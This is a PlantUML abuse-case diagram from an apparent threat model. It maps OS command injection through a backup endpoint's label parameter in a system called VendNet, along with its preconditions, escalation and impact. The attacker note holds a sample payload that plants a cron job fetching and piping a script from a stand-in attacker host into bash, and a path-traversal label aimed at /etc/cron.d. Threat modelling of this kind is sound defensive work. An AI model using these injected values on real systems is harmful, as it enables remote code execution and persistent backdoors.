@startuml AC-01_OS_Command_Injection

title AC-01 — OS Command Injection via ProcessBuilder Backup Endpoint\nSTRIDE: Tampering | Severity: Critical | Mitigation: M-01

left to right direction

skinparam usecase {
  BackgroundColor<< abuse >> #FFCCCC
  BorderColor<< abuse >> #CC0000
  FontColor<< abuse >> #CC0000
  BackgroundColor<< normal >> #DDEEFF
  BorderColor<< normal >> #336699
  BackgroundColor<< impact >> #FFF3CD
  BorderColor<< impact >> #856404
}
skinparam actorBackgroundColor #EEF
skinparam actorBorderColor #336699
skinparam noteFontSize 10

actor "Administrator\n(Legitimate)" as admin #DDEEFF
actor "Malicious Admin /\nCompromised Account" as attacker #FFCCCC

rectangle "VendNet System" {
  usecase "Trigger On-Demand\nBackup" as UC1 << normal >>
  usecase "Inject OS Command\nvia Backup Label Parameter" as AC1 << abuse >>
  usecase "Execute Arbitrary\nOS Command as Service Account" as AC1b << abuse >>
  usecase "Establish Persistent\nReverse Shell / Cron Backdoor" as AC1c << abuse >>
}

admin --> UC1

attacker --> AC1
AC1 ..> UC1       : <<threatens>>
AC1 ..> AC1b      : <<extends>>
AC1b ..> AC1c     : <<extends>>

note right of AC1
  **Preconditions:**
  • Valid Administrator-scoped JWT
  • POST /admin/backups accepts
    user-supplied label field
  • Label appended to ProcessBuilder
    args without allowlist sanitisation
  • Service account has write access
    to /var/vendnet/ and beyond
end note

note right of AC1c
  **Impact:**
  Integrity: audit logs overwritten,
  DB records modified via MySQL creds
  Availability: service killed / disk filled
  Business: full system compromise,
  GDPR Art. 33 notification required
end note

note bottom of attacker
  **Attack vector:**
  {"label":"daily\\n* * * * * root curl http://attacker.com/s | bash"}
  or path traversal: {"label":"../../../../etc/cron.d/vendnet_persist"}
end note

@enduml
